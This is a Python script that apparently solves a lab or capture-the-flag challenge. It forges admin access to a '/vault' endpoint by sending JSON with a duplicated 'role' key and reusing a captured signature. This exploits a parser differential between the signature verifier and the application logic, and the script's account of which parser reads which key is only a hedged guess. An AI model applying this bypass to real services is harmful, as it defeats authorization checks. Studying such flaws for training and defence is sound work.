import urllib.request
import urllib.parse
import json

def solve():
    base_url = "http://cns-test.idlab.uantwerpen.be:50007"
    
    # 1. Get the legitimate signed request
    print("Fetching legitimate signed request...")
    req = urllib.request.Request(f"{base_url}/challenge")
    try:
        with urllib.request.urlopen(req) as response:
            if response.status != 200:
                print(f"Failed to get challenge: {response.status}")
                return
            challenge_data = json.loads(response.read().decode())
    except Exception as e:
        print(f"Error fetching challenge: {e}")
        return
    
    signature = challenge_data.get("signature")
    message = challenge_data.get("message")
    
    print(f"Original Message: {message}")
    print(f"Original Signature: {signature}")

    # 2. Craft the malicious payload
    # The vulnerability lies in JSON interoperability regarding duplicate keys.
    # The HMAC verifier likely uses a parser that takes the LAST occurrence of 'role' (user),
    # while the application logic (the vault) takes the FIRST occurrence (admin).
    payload = '{"action":"view","role":"admin","role":"user"}'
    
    print(f"Sending malicious payload: {payload}")
    
    # 3. Submit to /vault with the original signature
    headers = {
        "Content-Type": "application/json",
        "X-Signature": signature
    }
    
    req_vault = urllib.request.Request(
        f"{base_url}/vault", 
        data=payload.encode(), 
        headers=headers, 
        method='POST'
    )
    
    try:
        with urllib.request.urlopen(req_vault) as response:
            print(f"Status Code: {response.status}")
            print(f"Response: {response.read().decode()}")
    except urllib.error.HTTPError as e:
        print(f"Status Code: {e.code}")
        print(f"Response: {e.read().decode()}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    solve()
